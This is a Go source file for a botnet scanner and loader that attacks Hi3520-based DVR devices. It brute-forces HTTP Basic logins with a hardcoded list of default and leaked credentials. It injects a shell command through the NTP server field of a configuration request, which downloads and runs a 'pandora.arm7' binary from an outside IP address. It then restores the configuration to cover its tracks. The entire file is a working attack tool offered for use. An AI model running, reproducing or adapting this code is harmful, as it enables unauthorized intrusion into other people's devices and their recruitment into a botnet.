package main

import (
    "net"
    "time"
    "bufio"
    "fmt"
    "os"
    "sync"
    "strings"
    "strconv"
    "encoding/base64"
)

var statusAttempted, statusLogins, statusFound, statusVuln, statusClean int
var cntLen int = 292

var CONNECT_TIMEOUT time.Duration = 30
var READ_TIMEOUT time.Duration = 15
var WRITE_TIMEOUT time.Duration = 10
var syncWait sync.WaitGroup
var cntLenString string

var payload string ="cd /tmp;rm -rf armv7l;wget http://45.81.39.185/Pandoras_Box/pandora.arm7;chmod +x pandora.arm7;./pandora.arm7 pandora.arm7;rm -rf pandora.arm7;curl -O http://45.81.39.185/Pandoras_Box/pandora.arm7;chmod +x pandora.arm7;./pandora.arm7 pandora.arm7;rm -rf pandora.arm7;"
var paths = [...]string{"/dvr/cmd", "/cn/cmd"}
var logins = [...]string{"root:icatch99", "root:1234", "report:8Jg0SR8K50", "admin:$$Mau.arq2782$$", "admin:qazxsw!", "vinotiktik:LUNAluna2016", "admin:Netforce81", "admin:8188201", "admin:henryg", "uno:", "eredidicapua104:eredidicapua104", "Dave:Cantona07123!", "admin:5200", "admin:lorenzo2013", "admin:admin", "admin:123456", "root:123456", "admin:030609", "admin:adminjel00", "admin:Amst@09", "admin:t3backd00r", "admin:user", "admin:admin256", "admin:1234", "admin:519070", "admin:888888", "admin:88888888", "admin:86244455", "aa:11", "admin:19861986", "admin:ce", "Tenshi:in_3xprecion1175", "admin:BST#33", "admin:l242014", "admin:password", "admin:12345", "admin:", "admin:0000", "admin:1111", "admin:1234567890", "admin:123", "admin:", "admin:666666", "admin:admin123", "admin:administrator", "administartor:password", "admin:p@ssword", "guest:guest"}

func zeroByte(a []byte) {
    for i := range a {
        a[i] = 0
    }
}

func setWriteTimeout(conn net.Conn, timeout time.Duration) {
	conn.SetWriteDeadline(time.Now().Add(timeout * time.Second))
}

func setReadTimeout(conn net.Conn, timeout time.Duration) {
	conn.SetReadDeadline(time.Now().Add(timeout * time.Second))
}

func getStringInBetween(str string, start string, end string) (result string) {

    s := strings.Index(str, start)
    if s == -1 {
        return
    }

    s += len(start)
    e := strings.Index(str, end)

    if (s > 0 && e > s + 1) {
        return str[s:e]
    } else {
        return "null"
    }
}

func processTarget(target string) {

    var authPos int = -1
    var pathPos int = -1

    statusAttempted++

    conn, err := net.DialTimeout("tcp", target, CONNECT_TIMEOUT * time.Second)
    if err != nil {
        syncWait.Done()
        return
    }

    setWriteTimeout(conn, WRITE_TIMEOUT)
    conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Linux Gnu (cow) \r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nUpgrade-Insecure-Requests: 1\r\n\r\n"))

    setReadTimeout(conn, READ_TIMEOUT)
    bytebuf := make([]byte, 512)
    l, err := conn.Read(bytebuf)
    if err != nil || l <= 0 {
        zeroByte(bytebuf)
        conn.Close()
        return
    }

    if strings.Contains(string(bytebuf), "401 Unauthorized") && strings.Contains(string(bytebuf), "Basic realm=") {
        statusFound++
    } else {
        zeroByte(bytebuf)
        conn.Close()
        return
    }

    zeroByte(bytebuf)
    conn.Close()

    for i := 0; i < len(logins); i++ {

        conn, err := net.DialTimeout("tcp", target, CONNECT_TIMEOUT * time.Second)
        if err != nil {
            break
        }

        setWriteTimeout(conn, WRITE_TIMEOUT)
        conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Linux Gnu (cow) \r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nUpgrade-Insecure-Requests: 1\r\nAuthorization: Basic " + logins[i] + "\r\n\r\n"))

        setReadTimeout(conn, READ_TIMEOUT)
        bytebuf := make([]byte, 2048)
        l, err := conn.Read(bytebuf)
        if err != nil || l <= 0 {
            zeroByte(bytebuf)
            conn.Close()
            syncWait.Done()
            return
        }

        if (strings.Contains(string(bytebuf), "HTTP/1.1 200") || strings.Contains(string(bytebuf), "HTTP/1.0 200")) {
            statusLogins++
            authPos = i
            zeroByte(bytebuf)
            conn.Close()
            break
        } else {
            zeroByte(bytebuf)
            conn.Close()
            continue
        }
    }

    if (authPos == -1) {
        syncWait.Done()
        return
    }

    for i := 0; i < len(paths); i++ {

        conn, err = net.DialTimeout("tcp", target, CONNECT_TIMEOUT * time.Second)
        if err != nil {
            break
        }

        setWriteTimeout(conn, WRITE_TIMEOUT)
        conn.Write([]byte("POST " + paths[i] + " HTTP/1.1\r\nHost: " + target + "\r\nAccept-Encoding: gzip, deflate\r\nContent-Length: " + cntLenString + "\r\nAuthorization: Basic " + logins[authPos] + "\r\nUser-Agent: Linux Gnu (cow) \r\n\r\n<?xml version=\"1.0\" encoding=\"UTF-8\"?><DVR Platform=\"Hi3520\"><SetConfiguration File=\"service.xml\"><![CDATA[<?xml version=\"1.0\" encoding=\"UTF-8\"?><DVR Platform=\"Hi3520\"><Service><NTP Enable=\"True\" Interval=\"20000\" Server=\"time.nist.gov&" + payload + ";echo DONE\"/></Service></DVR>]]></SetConfiguration></DVR>\r\n\r\n"))

        time.Sleep(10 * time.Second)

        setReadTimeout(conn, READ_TIMEOUT)
        bytebuf = make([]byte, 2048)
        l, err = conn.Read(bytebuf)
        if err != nil || l <= 0 {
            zeroByte(bytebuf)
            conn.Close()
            continue
        }

        if (strings.Contains(string(bytebuf), "HTTP/1.1 200") || strings.Contains(string(bytebuf), "HTTP/1.0 200")) {
            pathPos = i
            zeroByte(bytebuf)
            conn.Close()
            statusVuln++
            break
        } else {
            zeroByte(bytebuf)
            conn.Close()
            continue
        }
    }

    if (pathPos != -1) {

        conn, err = net.DialTimeout("tcp", target, CONNECT_TIMEOUT * time.Second)
        if err != nil {
            syncWait.Done()
            return
        }

        setWriteTimeout(conn, WRITE_TIMEOUT)
        conn.Write([]byte("POST " + paths[pathPos] + " HTTP/1.1\r\nHost: " + target + "\r\nAccept-Encoding: gzip, deflate\r\nContent-Length: 281\r\nAuthorization: Basic " + logins[authPos] + "\r\nUser-Agent: Linux Gnu (cow) \r\n\r\n<?xml version=\"1.0\" encoding=\"UTF-8\"?><DVR Platform=\"Hi3520\"><SetConfiguration File=\"service.xml\"><![CDATA[<?xml version=\"1.0\" encoding=\"UTF-8\"?><DVR Platform=\"Hi3520\"><Service><NTP Enable=\"True\" Interval=\"20000\" Server=\"time.nist.gov\"/></Service></DVR>]]></SetConfiguration></DVR>\r\n\r\n"))

        setReadTimeout(conn, READ_TIMEOUT)
        bytebuf = make([]byte, 2048)
        l, err = conn.Read(bytebuf)
        if err != nil || l <= 0 {
            zeroByte(bytebuf)
            conn.Close()
            return
        }

        if (strings.Contains(string(bytebuf), "HTTP/1.1 200") || strings.Contains(string(bytebuf), "HTTP/1.0 200")) {
            statusClean++
        }

        zeroByte(bytebuf)
        conn.Close()
    }

    syncWait.Done()
    return

}

func main() {

	var i int = 0

    for i = 0; i < len(logins); i++ {
        logins[i] = base64.StdEncoding.EncodeToString([]byte(logins[i]))
    }

    cntLen += len(payload)
    cntLenString = strconv.Itoa(cntLen)

    if (len(os.Args) != 2) {
        fmt.Println("[Scanner] Missing argument (port/listen)")
        return
    }

	go func() {
        i = 0
		for {
			fmt.Printf("%d's |\033[0;32m Total %d |\033[0;31m Device Found: %d |\033[0;34m Authenticated: %d |\033[0;35m Payload Sent: %d |\033[0;33m Cleaned Up: %d\r\n", i, statusAttempted, statusFound, statusLogins, statusVuln, statusClean)
			time.Sleep(1 * time.Second)
			i++
		}
	} ()

    for {
        r := bufio.NewReader(os.Stdin)
        scan := bufio.NewScanner(r)
        for scan.Scan() {
            if os.Args[1] == "listen" {
        		go processTarget(scan.Text())
        	} else {
        		go processTarget(scan.Text() + ":" + os.Args[1])
        	}
            syncWait.Add(1)
        }
    }
}
